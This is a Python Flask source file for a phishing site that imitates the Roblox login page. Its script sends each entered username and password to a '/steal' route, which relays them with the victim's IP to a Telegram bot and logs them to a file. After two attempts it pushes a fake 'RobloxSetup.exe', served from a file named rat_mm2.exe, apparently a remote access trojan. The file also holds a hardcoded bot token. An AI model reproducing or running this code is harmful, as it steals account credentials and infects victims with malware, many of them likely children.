from flask import Flask, request, send_file
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Roblox</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a1a;
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
            }
            .login-container {
                background: #14142a;
                border-radius: 16px;
                padding: 40px 35px 35px;
                width: 400px;
                max-width: 100%;
                box-shadow: 0 15px 40px rgba(0,0,0,0.9);
                text-align: center;
            }
            .roblox-logo {
                width: 180px;
                margin-bottom: 20px;
            }
            .login-title {
                color: #fff;
                font-size: 24px;
                font-weight: 500;
                margin-bottom: 25px;
            }
            .input-group {
                margin-bottom: 14px;
                text-align: left;
            }
            .input-group label {
                display: block;
                color: #b0c4de;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 5px;
            }
            .input-group input {
                width: 100%;
                padding: 14px 16px;
                background: #0a0a1a;
                border: 2px solid #2a2a4a;
                border-radius: 8px;
                color: #fff;
                font-size: 16px;
                transition: all 0.25s ease;
                outline: none;
            }
            .input-group input::placeholder {
                color: #6a8aae;
                font-weight: 300;
            }
            .input-group input:focus {
                border-color: #00bfff;
                background: #12122a;
                box-shadow: 0 0 0 3px rgba(0,191,255,0.2);
            }
            .login-btn {
                width: 100%;
                padding: 15px;
                background: #00bfff;
                border: none;
                border-radius: 8px;
                color: #fff;
                font-size: 18px;
                font-weight: 700;
                cursor: pointer;
                transition: background 0.2s;
                margin-top: 8px;
            }
            .login-btn:hover {
                background: #009acd;
            }
            .login-btn:active {
                transform: scale(0.98);
            }
            .error-message {
                color: #ff6b6b;
                font-size: 14px;
                margin-top: 14px;
                min-height: 22px;
                font-weight: 500;
            }
            .download-btn {
                display: none;
                margin-top: 20px;
                padding: 15px;
                background: #00b894;
                border: none;
                border-radius: 8px;
                color: #fff;
                font-weight: 700;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                transition: background 0.2s;
            }
            .download-btn:hover {
                background: #00a381;
            }
            .download-btn:active {
                transform: scale(0.98);
            }
            .footer-links {
                color: #6a8aae;
                font-size: 13px;
                margin-top: 22px;
                border-top: 1px solid #1a1a4a;
                padding-top: 18px;
                display: flex;
                flex-direction: column;
                gap: 8px;
            }
            .footer-links a {
                color: #6a8aae;
                text-decoration: none;
            }
            .footer-links a:hover {
                color: #fff;
            }
            .signup-link {
                color: #6a8aae;
                font-size: 14px;
                margin-top: 15px;
            }
            .signup-link a {
                color: #00bfff;
                text-decoration: none;
            }
            .signup-link a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
    <div class="login-container">
        <img class="roblox-logo" src="https://www.roblox.com/favicon.ico" alt="Roblox">
        <h1 class="login-title">Login to Roblox</h1>

        <form id="loginForm">
            <div class="input-group">
                <label for="username">Username/Email/Phone</label>
                <input type="text" id="username" placeholder="Username/Email/Phone" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button class="login-btn" type="submit">Log In</button>
        </form>

        <div id="message" class="error-message"></div>

        <div class="footer-links">
            <a href="#">Forgot Password or Username?</a>
            <a href="#">Email Me a One-Time Code</a>
            <a href="#">Quick Sign-in</a>
        </div>

        <div class="signup-link">
            Don't have an account? <a href="#">Sign Up</a>
        </div>

        <button class="download-btn" id="downloadBtn">⬇️ Download RobloxSetup.exe</button>
    </div>

    <script>
        let attempts = 0;

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const login = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();

            if (!login || !pass) {
                document.getElementById('message').innerText = 'Please fill in all fields';
                return;
            }

            try {
                await fetch('/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ login, pass })
                });
            } catch {}

            attempts++;
            document.getElementById('message').innerText = 'Incorrect username or password. Please try again.';
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';

            if (attempts >= 2) {
                document.getElementById('message').innerHTML = '⚠️ <span style="color:#ffcc00;">There was a problem with your login.</span> Please download the Roblox update.';
                document.getElementById('downloadBtn').style.display = 'block';
            }
        });

        document.getElementById('downloadBtn').addEventListener('click', function() {
            window.location.href = '/download/roblox_setup.exe';
            this.innerText = '✅ File downloaded! Run it to log in.';
            this.disabled = true;
            this.style.background = '#00b894';
        });
    </script>
    </body>
    </html>
    '''

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    login = data.get('login')
    password = data.get('pass')
    ip = request.remote_addr

    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
    send_tg(msg)

    with open('steals.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")

    return {"status": "ok"}, 200

@app.route('/download/roblox_setup.exe')
def download_exe():
    try:
        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
    except:
        return "File temporarily unavailable", 404

@app.route('/logs')
def logs():
    if not os.path.exists('steals.txt'):
        return "No logs"
    with open('steals.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
